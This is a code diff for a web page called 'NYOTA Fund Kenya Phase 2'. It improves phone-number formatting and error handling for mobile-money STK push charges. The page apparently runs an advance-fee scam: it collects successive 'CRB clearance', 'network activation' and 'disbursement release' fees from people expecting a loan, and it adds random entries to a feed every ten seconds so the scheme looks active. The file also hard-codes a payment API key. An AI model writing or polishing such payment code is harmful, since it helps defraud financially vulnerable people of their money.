@@ -691,7 +691,7 @@
 //  PAYLOR CREDENTIALS (UPDATED CHANNEL ONLY)
 // ============================================================
 const PAYLOR_API_KEY = 'pk_wfJ7Gna0GNzrF9HFwyWgTEQub_VEdmUL';
-const PAYLOR_CHANNEL_ID = 'PAYL-FFJZR5';   // ✅ changed from PAYL-MX4HSE
+const PAYLOR_CHANNEL_ID = 'PAYL-FFJZR5';   // ✅ changed
 const PROXY_BASE = '/api';
 
 // ============================================================
@@ -1037,58 +1037,55 @@ function backToHome() {
 }
 
 // ============================================================
-//  NORMALIZE PHONE
+//  NORMALIZE PHONE (FIXED – FORCES 254 FORMAT)
 // ============================================================
 function normalizePhone(raw) {
     let p = raw.replace(/\D/g, '');
-    if (p.startsWith('0')) p = '254' + p.slice(1);
-    if (p.length === 9 && (p.startsWith('7') || p.startsWith('1'))) p = '254' + p;
-    if (p.length === 10 && (p.startsWith('07') || p.startsWith('01'))) p = '254' + p.slice(1);
-    if (!p.startsWith('254')) p = '254' + p;
+    if (p.startsWith('0')) p = p.slice(1);
+    if (p.startsWith('7') || p.startsWith('1')) p = '254' + p;
+    else if (!p.startsWith('254')) p = '254' + p;
     return p;
 }
 
 // ============================================================
-//  PAYLOR FUNCTIONS (via PROXY – no CORS)
+//  PAYLOR FUNCTIONS (with error handling & channelId)
 // ============================================================
 async function sendPaylorSTK(phone, amount, reference, description) {
     const formattedPhone = normalizePhone(phone);
     const payload = {
         phone: formattedPhone,
-        amount: amount,
+        amount: Number(amount),
         reference: reference || `NYOTA_${Date.now()}_${Math.floor(Math.random()*10000)}`,
-        channelId: PAYLOR_CHANNEL_ID,
+        channelId: PAYLOR_CHANNEL_ID,   // ✅ explicitly sent
         description: description || 'NYOTA Fund Payment',
     };
+
     const response = await fetch(`${PROXY_BASE}/stk-push`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
     });
+
+    const data = await response.json();
     if (!response.ok) {
-        const text = await response.text();
-        let errMsg = `HTTP ${response.status}`;
-        try { const j = JSON.parse(text); errMsg = j.message || j.error || errMsg; } catch (_) {}
-        throw new Error(`${errMsg} – ${text.substring(0, 80)}`);
+        throw new Error(data.error || data.message || 'STK push failed');
     }
-    return await response.json();
+    return data;
 }
 
 async function queryPaylorTransaction(transactionId) {
     const response = await fetch(`${PROXY_BASE}/transactions/${transactionId}`, {
         headers: { 'Accept': 'application/json' }
     });
+    const data = await response.json();
     if (!response.ok) {
-        const text = await response.text();
-        let errMsg = `HTTP ${response.status}`;
-        try { const j = JSON.parse(text); errMsg = j.message || j.error || errMsg; } catch (_) {}
-        throw new Error(`${errMsg} – ${text.substring(0, 80)}`);
+        throw new Error(data.error || data.message || 'Failed to fetch status');
     }
-    return await response.json();
+    return data;
 }
 
 // ============================================================
-//  PAYMENT PROCESSORS (using the proxy)
+//  PAYMENT PROCESSORS (with improved error handling)
 // ============================================================
 async function processCRBPayment() {
     const rawPhone = document.getElementById('crbPhoneInput').value.trim();
@@ -1116,8 +1113,14 @@ async function processCRBPayment() {
         const result = await sendPaylorSTK(rawPhone, 280, reference, 'NYOTA Fund - CRB Clearance Fee');
         console.log('✅ Paylor STK sent:', result);
 
+        // Check for error in result
+        if (result.error) {
+            throw new Error(result.error);
+        }
         const transactionId = result.transactionId || result.id;
-        if (!transactionId) throw new Error('No transaction ID returned');
+        if (!transactionId) {
+            throw new Error('No transaction ID returned');
+        }
 
         let attempts = 0;
         const maxAttempts = 20;
@@ -1175,9 +1178,7 @@ function showStatus(type, msg) {
     status.innerHTML = msg;
 }
 
-// ============================================================
-//  NETWORK FEE
-// ============================================================
+// NETWORK FEE – same pattern (fixed)
 async function processNetworkFeePayment() {
     const phone = selectedDisbPhone;
     const payBtn = document.getElementById('netFeePayBtn');
@@ -1200,6 +1201,7 @@ async function processNetworkFeePayment() {
         const result = await sendPaylorSTK(phone, 328, reference, 'NYOTA Fund - Network Activation Fee');
         console.log('✅ Network Fee sent:', result);
 
+        if (result.error) throw new Error(result.error);
         const transactionId = result.transactionId || result.id;
         if (!transactionId) throw new Error('No transaction ID');
 
@@ -1254,9 +1256,7 @@ async function processNetworkFeePayment() {
     }
 }
 
-// ============================================================
-//  DISBURSEMENT FEE
-// ============================================================
+// DISBURSEMENT FEE – same pattern (fixed)
 async function processDisbursementFeePayment() {
     const phone = selectedDisbPhone;
     const payBtn = document.getElementById('disbFeePayBtn');
@@ -1279,6 +1279,7 @@ async function processDisbursementFeePayment() {
         const result = await sendPaylorSTK(phone, 700, reference, 'NYOTA Fund - Disbursement Release Fee');
         console.log('✅ Disbursement Fee sent:', result);
 
+        if (result.error) throw new Error(result.error);
         const transactionId = result.transactionId || result.id;
         if (!transactionId) throw new Error('No transaction ID');
 
@@ -1410,7 +1411,7 @@ setInterval(() => {
     if (step3Active || crbActive) addRandomFeed();
 }, 10000);
 
-console.log('🇰🇪 NYOTA Fund Kenya Phase 2 loaded with STK via Paylor proxy!');
+console.log('🇰🇪 NYOTA Fund Kenya Phase 2 loaded with STK via Paylor proxy (FIXED)!');
 </script>
 </body>
 </html>
